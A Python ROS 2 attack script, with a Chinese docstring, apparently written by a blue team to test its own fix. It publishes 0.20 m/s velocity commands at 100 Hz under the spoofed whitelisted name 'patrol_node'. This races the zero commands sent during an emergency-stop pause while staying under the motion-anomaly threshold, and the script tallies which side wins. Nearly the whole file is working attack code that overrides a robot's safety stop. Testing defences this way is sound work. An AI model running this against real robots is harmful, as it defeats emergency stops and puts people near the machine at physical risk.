#!/usr/bin/env python3
"""攻擊 N9 — cmd_vel race during emergency stop.

藍方自己預判的攻擊。漏洞：
    D1 PHYSICS_LIN_MAX = 0.25 m/s (現在 0.23)，attacker 用 0.20 m/s 不會觸發。
    D4 抓到 dual publisher → IDS 發 alert → monitor emergency_stop（3s）+ patrol pause（30s）
    但 attacker 高頻（100Hz）持續 publish 0.20 m/s，
    若 patrol pause 期間只用 5Hz 送 0 → attacker 大部分時間贏，robot 仍移動。

藍方修補：
    1. D1 threshold 收緊 0.25 → 0.23
    2. patrol pause 期間用 50Hz 而不是 5Hz 送 0 cmd_vel 跟 attacker 競爭

驗證方式：
    監聽 /cmd_vel 一段時間，數 zero-msgs vs nonzero-msgs。
    修補前：attacker 100Hz 贏，>80% 是 nonzero
    修補後：patrol 50Hz 競爭，~33% 是 attacker（其他都是 0）→ robot 走慢一半 + 不會持續加速
"""
import sys
import time
import rclpy
from rclpy.node import Node
from geometry_msgs.msg import TwistStamped


class CmdVelRacer(Node):

    def __init__(self):
        super().__init__('patrol_node')  # 偽裝白名單名字
        self._pub = self.create_publisher(TwistStamped, '/cmd_vel', 10)
        # 100Hz 高頻
        self.create_timer(0.01, self._race)
        self._sub = self.create_subscription(
            TwistStamped, '/cmd_vel', self._tally, 10)
        self._zero = 0
        self._nonzero = 0
        self._attacker = 0
        self.get_logger().error('🏁 100Hz publish 0.20 m/s — 跟 patrol pause 競爭 /cmd_vel')

    def _race(self):
        m = TwistStamped()
        m.header.stamp = self.get_clock().now().to_msg()
        m.header.frame_id = 'base_link'
        m.twist.linear.x = 0.20    # 在 D1 0.23 門檻內
        self._pub.publish(m)
        self._attacker += 1

    def _tally(self, msg: TwistStamped):
        if abs(msg.twist.linear.x) < 0.001:
            self._zero += 1
        else:
            self._nonzero += 1


def main():
    rclpy.init()
    node = CmdVelRacer()
    duration = float(sys.argv[1]) if len(sys.argv) > 1 else 15.0
    deadline = time.monotonic() + duration
    try:
        while rclpy.ok() and time.monotonic() < deadline:
            rclpy.spin_once(node, timeout_sec=0.05)
    finally:
        z, n = node._zero, node._nonzero
        total = z + n
        if total:
            node.get_logger().error(
                f'⏹ 收到 /cmd_vel 總數: {total} — '
                f'zero={z} ({100*z/total:.0f}%), nonzero={n} ({100*n/total:.0f}%) '
                f'| attacker 發了 {node._attacker} 筆'
            )
        node.destroy_node()
        rclpy.shutdown()


if __name__ == '__main__':
    main()
